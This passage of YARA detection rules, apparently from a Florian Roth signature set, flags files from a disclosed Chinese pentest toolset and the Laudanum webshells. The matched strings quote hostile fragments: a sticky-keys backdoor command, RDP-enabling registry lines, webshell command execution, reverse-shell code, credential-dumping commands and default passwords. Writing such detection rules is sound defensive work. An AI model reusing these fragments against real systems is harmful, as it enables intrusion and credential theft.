Toolset\"\n      date = \"2015-06-23 22:22:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"upfile.asp \" fullword ascii\n      $s2 = \"[wscript.shell]\" fullword ascii\n      $s3 = \"XP_CMDSHELL\" fullword ascii\n      $s4 = \"[XP_CMDSHELL]\" fullword ascii\n      $s5 = \"http://d99net.3322.org\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and 4 of them\n}\n\nrule CN_Honker_mafix_root_RID2EFF : CHINA DEMO SCRIPT SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file root\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:38:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo \\\"# vbox (voice box) getty\\\" >> /tmp/.init1\" fullword ascii\n      $s1 = \"cp /var/log/tcp.log $HOMEDIR/.owned/bex2/snifflog\" fullword ascii\n      $s2 = \"if [ -f /sbin/xlogin ]; then\" fullword ascii\n   condition: \n      filesize < 96KB and all of them\n}\n\nrule CN_Honker_passwd_dict_3389_RID3092 : CHINA DEMO SCRIPT SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file 3389.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:45:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"654321\" fullword ascii\n      $s1 = \"admin123\" fullword ascii\n      $s2 = \"admin123456\" fullword ascii\n      $s3 = \"administrator\" fullword ascii\n      $s4 = \"passwd\" fullword ascii\n      $s5 = \"password\" fullword ascii\n      $s7 = \"12345678\" fullword ascii\n   condition: \n      filesize < 1KB and all of them\n}\n\nrule CN_Honker_Perl_serv_U_RID2F2D : CHINA DEMO SCRIPT SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file Perl-serv-U.pl\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:46:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$dir = 'C:\\\\\\\\WINNT\\\\\\\\System32\\\\\\\\';\" fullword ascii\n      $s2 = \"$sock = IO::Socket::INET->new(\\\"127.0.0.1:$adminport\\\") || die \\\"fail\\\";\" fullword ascii\n   condition: \n      filesize < 8KB and all of them\n}\n\nrule CN_Honker_F4ck_Team_f4ck_RID2FBC : CHINA DEMO SCRIPT SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file f4ck.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:09:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"PassWord:F4ckTeam!@#\" fullword ascii\n      $s1 = \"UserName:F4ck\" fullword ascii\n      $s2 = \"F4ck Team\" fullword ascii\n   condition: \n      filesize < 1KB and all of them\n}\n\nrule CN_Honker_sig_3389_3389_RID2E76 : CHINA DEMO SCRIPT SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file 3389.vbs\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:15:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"success = obj.run(\\\"cmd /c takeown /f %SystemRoot%\\\\system32\\\\sethc.exe&echo y| \" ascii\n   condition: \n      filesize < 10KB and all of them\n}\n\nrule CN_Honker_sig_3389_3389_2_RID2F07 : CHINA DEMO SCRIPT SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file 3389.bat\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:39:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"@del c:\\\\termsrvhack.dll\" fullword ascii\n      $s2 = \"@del c:\\\\3389.txt\" fullword ascii\n   condition: \n      filesize < 3KB and all of them\n}\n\nrule CN_Honker_Injection_Transit_jmCook_RID3470 : CHINA DEMO SCRIPT SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file jmCook.asp\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:30:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".Open \\\"POST\\\",PostUrl,False\" fullword ascii\n      $s2 = \"JmdcwName=request(\\\"jmdcw\\\")\" fullword ascii\n   condition: \n      filesize < 9KB and all of them\n}\n\nrule CN_Honker_portRecall_pr_RID3020 : CHINA DEMO SCRIPT SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file pr\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:26:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage: Same as lcx.exe in win32 :)\" fullword ascii\n      $s2 = \"connect to client\" fullword ascii\n      $s3 = \"PR(Packet redirection) for linux \" fullword ascii\n   condition: \n      filesize < 70KB and all of them\n}\n\nrule CN_Honker_sig_3389_3389_3_RID2F08 : CHINA DEMO SCRIPT SUSP T1543_003 {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file 3389.bat\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:39:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, SUSP, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"echo \\\"fDenyTSConnections\\\"=dword:00000000>>3389.reg \" fullword ascii\n      $s2 = \"echo \\\"PortNumber\\\"=dword:00000d3d>>3389.reg \" fullword ascii\n      $s3 = \"echo [HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server]>>\" ascii\n   condition: \n      filesize < 2KB and all of them\n}\n\nrule CN_Honker_Alien_D_RID2D53 : CHINA DEMO SCRIPT SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file D.ASP\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:27:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Paths_str=\\\"c:\\\\windows\\\\\\\"&chr(13)&chr(10)&\\\"c:\\\\Documents and Settings\\\\\\\"&chr\" ascii\n      $s1 = \"CONST_FSO=\\\"Script\\\"&\\\"ing.Fil\\\"&\\\"eSyst\\\"&\\\"emObject\\\"\" fullword ascii\n      $s2 = \"Response.Write \\\"<form id='form1' name='form1' method='post' action=''>\\\"\" fullword ascii\n      $s3 = \"set getAtt=FSO.GetFile(filepath)\" fullword ascii\n      $s4 = \"Response.Write \\\"<input name='NoCheckTemp' type='checkbox' id='NoCheckTemp' chec\" ascii\n   condition: \n      filesize < 30KB and 2 of them\n}\n\nrule CN_Honker_ChinaChopper_db_RID30A0 : CHINA DEMO SCRIPT SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file db.mdb\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:47:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://www.maicaidao.com/server.phpcaidao\" fullword wide\n      $s2 = \"<O>act=login</O>\" fullword wide\n      $s3 = \"<H>localhost</H>\" fullword wide\n   condition: \n      filesize < 340KB and 2 of them\n}\n\nrule CN_Honker_syconfig_RID2E29 : CHINA DEMO FILE SCRIPT SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file syconfig.dll\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:02:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, FILE, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"Hashq.CrackHost+FormUnit\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x0100 and filesize < 18KB and all of them\n}\n\nrule CN_Honker_linux_bin_RID2E8F : CHINA DEMO LINUX SCRIPT SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file linux_bin\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:19:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, LINUX, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"client.sin_port = htons(atoi(argv[3]));\" fullword ascii\n      $s2 = \"printf(\\\"\\\\n\\\\n*********Waiting Client connect*****\\\\n\\\\n\\\");\" fullword ascii\n   condition: \n      filesize < 20KB and all of them\n}\n\nrule CN_Honker_Intersect2_Beta_RID3085 : CHINA DEMO FILE SCRIPT SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file Intersect2-Beta.py\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:43:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, FILE, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"os.system(\\\"ls -alhR /home > AllUsers.txt\\\")\" fullword ascii\n      $s2 = \"os.system('getent passwd > passwd.txt')\" fullword ascii\n      $s3 = \"os.system(\\\"rm -rf credentials/\\\")\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x2123 and filesize < 50KB and 2 of them\n}\n\nrule CN_Honker_IIS_logcleaner1_0_readme_RID33B4 : CHINA DEMO SCRIPT SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file readme.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:59:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"LogCleaner.exe <ip> [Logpath]\" fullword ascii\n      $s3 = \"http://l-y.vicp.net\" fullword ascii\n   condition: \n      filesize < 7KB and all of them\n}\n\nrule CN_Honker_Alien_command_RID2FEE : CHINA DEMO SCRIPT SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file command.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:18:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"for /d %i in (E:\\\\freehost\\\\*) do @echo %i\" fullword ascii\n      $s1 = \"/c \\\"C:\\\\windows\\\\temp\\\\cscript\\\" C:\\\\windows\\\\temp\\\\iis.vbs\" fullword ascii\n   condition: \n      filesize < 8KB and all of them\n}\n\nrule CN_Honker_portRecall_bc_RID3003 : CHINA DEMO SCRIPT SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file bc.pl\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:21:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"print \\\"[*] Connected to remote host \\\\n\\\"; \" fullword ascii\n      $s1 = \"print \\\"Usage: $0 [Host] [Port] \\\\n\\\\n\\\";  \" fullword ascii\n      $s5 = \"print \\\"[*] Resolving HostName\\\\n\\\"; \" fullword ascii\n   condition: \n      filesize < 10KB and all of them\n}\n\nrule CN_Honker_Tuoku_script_MSSQL__RID3221 : CHINA DEMO SCRIPT SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file MSSQL_.asp\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:52:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"GetLoginCookie = Request.Cookies(Cookie_Login)\" fullword ascii\n      $s2 = \"if ShellPath=\\\"\\\" Then ShellPath = \\\"c:\\\\\\\\windows\\\\\\\\system32\\\\\\\\cmd.exe\\\"\" fullword ascii\n      $s8 = \"Set DD=CM.exec(ShellPath&\\\" /c \\\"&DefCmd)\" fullword ascii\n   condition: \n      filesize < 100KB and all of them\n}\n\nrule CN_Honker_nc_MOVE_RID2D2E : CHINA DEMO SCRIPT SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file MOVE.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:20:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Destination: http://202.113.20.235/gj/images/2.asp\" fullword ascii\n      $s1 = \"HOST: 202.113.20.235\" fullword ascii\n      $s2 = \"MOVE /gj/images/A.txt HTTP/1.1\" fullword ascii\n   condition: \n      filesize < 1KB and all of them\n}\n\nrule CN_Honker_mssqlpw_scan_RID2FE2 : CHINA DEMO SCRIPT SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file mssqlpw scan.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:16:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"response.Write(\\\"I Get it ! Password is <font color=red>\\\" & str & \\\"</font><BR>\" ascii\n      $s1 = \"response.Write \\\"Done!<br>Process \\\" & tTime & \\\" s\\\"\" fullword ascii\n   condition: \n      filesize < 6KB and all of them\n}\n\nrule Webshell_XML_WEB_INF_web_RID2FAD : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file web.xml\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 12:07:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<servlet-name>Command</servlet-name>\" fullword ascii\n      $s2 = \"<jsp-file>/cmd.jsp</jsp-file>\" fullword ascii\n   condition: \n      filesize < 1KB and all of them\n}\n\nrule Webshell_asp_file_RID2DE9 : DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file file.asp\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 10:52:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"' *** Written by Tim Medin <tim@counterhack.com>\" fullword ascii\n      $s2 = \"Response.BinaryWrite(stream.Read)\" fullword ascii\n      $s3 = \"Response.Write(Response.Status & Request.ServerVariables(\\\"REMOTE_ADDR\\\"))\" fullword ascii\n      $s4 = \"%><a href=\\\"<%=Request.ServerVariables(\\\"URL\\\")%>\\\">web root</a><br/><%\" fullword ascii\n      $s5 = \"set folder = fso.GetFolder(path)\" fullword ascii\n      $s6 = \"Set file = fso.GetFile(filepath)\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x253c and filesize < 30KB and 5 of them\n}\n\nrule Webshell_php_killnc_RID2ECA : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file killnc.php\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 11:29:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if ($_SERVER[\\\"REMOTE_ADDR\\\"] == $IP)\" fullword ascii\n      $s2 = \"header(\\\"HTTP/1.0 404 Not Found\\\");\" fullword ascii\n      $s3 = \"<?php echo exec('killall nc');?>\" fullword ascii\n      $s4 = \"<title>Laudanum Kill nc</title>\" fullword ascii\n      $s5 = \"foreach ($allowedIPs as $IP) {\" fullword ascii\n   condition: \n      filesize < 15KB and 4 of them\n}\n\nrule Webshell_asp_shell_2_RID2EF2 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file shell.asp\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 11:36:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<form action=\\\"shell.asp\\\" method=\\\"POST\\\" name=\\\"shell\\\">\" fullword ascii\n      $s2 = \"%ComSpec% /c dir\" fullword ascii\n      $s3 = \"Set objCmd = wShell.Exec(cmd)\" fullword ascii\n      $s4 = \"Server.ScriptTimeout = 180\" fullword ascii\n      $s5 = \"cmd = Request.Form(\\\"cmd\\\")\" fullword ascii\n      $s6 = \"' ***  http://laudanum.secureideas.net\" fullword ascii\n      $s7 = \"Dim wshell, intReturn, strPResult\" fullword ascii\n   condition: \n      filesize < 15KB and 4 of them\n}\n\nrule Webshell_settings_PHP_RID2F5E : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file settings.php\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 11:54:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Port: <input name=\\\"port\\\" type=\\\"text\\\" value=\\\"8888\\\">\" fullword ascii\n      $s2 = \"<li>Reverse Shell - \" fullword ascii\n      $s3 = \"<li><a href=\\\"<?php echo plugins_url('file.php', __FILE__);?>\\\">File Browser</a>\" ascii\n   condition: \n      filesize < 13KB and all of them\n}\n\nrule Webshell_asp_proxy_RID2E8B : DEMO T1090 T1505_003 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file proxy.asp\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 11:19:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1090, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"'response.write \\\"<br/>  -value:\\\" & request.querystring(key)(j)\" fullword ascii\n      $s2 = \"q = q & \\\"&\\\" & key & \\\"=\\\" & request.querystring(key)(j)\" fullword ascii\n      $s3 = \"for each i in Split(http.getAllResponseHeaders, vbLf)\" fullword ascii\n      $s4 = \"'urlquery = mid(urltemp, instr(urltemp, \\\"?\\\") + 1)\" fullword ascii\n      $s5 = \"s = urlscheme & urlhost & urlport & urlpath\" fullword ascii\n      $s6 = \"Set http = Server.CreateObject(\\\"Microsoft.XMLHTTP\\\")\" fullword ascii\n   condition: \n      filesize < 50KB and all of them\n}\n\nrule Webshell_cfm_shell_RID2E53 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file shell.cfm\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 11:09:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Executable: <Input type=\\\"text\\\" name=\\\"cmd\\\" value=\\\"cmd.exe\\\"><br>\" fullword ascii\n      $s2 = \"<cfif ( #suppliedCode# neq secretCode )>\" fullword ascii\n      $s3 = \"<cfif IsDefined(\\\"form.cmd\\\")>\" fullword ascii\n   condition: \n      filesize < 20KB and 2 of them\n}\n\nrule Webshell_aspx_shell_RID2ED9 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file shell.aspx\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 11:32:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"remoteIp = HttpContext.Current.Request.Headers[\\\"X-Forwarded-For\\\"].Split(new\" ascii\n      $s2 = \"remoteIp = Request.UserHostAddress;\" fullword ascii\n      $s3 = \"<form method=\\\"post\\\" name=\\\"shell\\\">\" fullword ascii\n      $s4 = \"<body onload=\\\"document.shell.c.focus()\\\">\" fullword ascii\n   condition: \n      filesize < 20KB and all of them\n}\n\nrule Webshell_php_shell_RID2E65 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file shell.php\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 11:12:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"command_hist[current_line] = document.shell.command.value;\" fullword ascii\n      $s2 = \"if (e.keyCode == 38 && current_line < command_hist.length-1) {\" fullword ascii\n      $s3 = \"array_unshift($_SESSION['history'], $command);\" fullword ascii\n      $s4 = \"if (preg_match('/^[[:blank:]]*cd[[:blank:]]*$/', $command)) {\" fullword ascii\n   condition: \n      filesize < 40KB and all of them\n}\n\nrule Webshell_php_reverse_shell_RID31C0 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file php-reverse-shell.php\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 13:35:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$process = proc_open($shell, $descriptorspec, $pipes);\" fullword ascii\n      $s2 = \"printit(\\\"Successfully opened reverse shell to $ip:$port\\\");\" fullword ascii\n      $s3 = \"$input = fread($pipes[1], $chunk_size);\" fullword ascii\n   condition: \n      filesize < 15KB and all of them\n}\n\nrule Webshell_php_dns_RID2D92 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file dns.php\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 10:37:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$query = isset($_POST['query']) ? $_POST['query'] : '';\" fullword ascii\n      $s2 = \"$result = dns_get_record($query, $types[$type], $authns, $addtl);\" fullword ascii\n      $s3 = \"if ($_SERVER[\\\"REMOTE_ADDR\\\"] == $IP)\" fullword ascii\n      $s4 = \"foreach (array_keys($types) as $t) {\" fullword ascii\n   condition: \n      filesize < 15KB and all of them\n}\n\nrule Webshell_jsp_cmd_2_RID2E17 : DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file cmd.war\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 10:59:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"cmd.jsp}\" fullword ascii\n      $s1 = \"cmd.jspPK\" fullword ascii\n      $s2 = \"WEB-INF/web.xml\" fullword ascii\n      $s3 = \"WEB-INF/web.xmlPK\" fullword ascii\n      $s4 = \"META-INF/MANIFEST.MF\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x4b50 and filesize < 2KB and all of them\n}\n\nrule Webshell_laudanum_RID2DFD : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file laudanum.php\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 10:55:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"public function __activate()\" fullword ascii\n      $s2 = \"register_activation_hook(__FILE__, array('WP_Laudanum', 'activate'));\" fullword ascii\n   condition: \n      filesize < 5KB and all of them\n}\n\nrule Webshell_php_file_RID2DED : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file file.php\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 10:52:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$allowedIPs =\" fullword ascii\n      $s2 = \"<a href=\\\"<?php echo 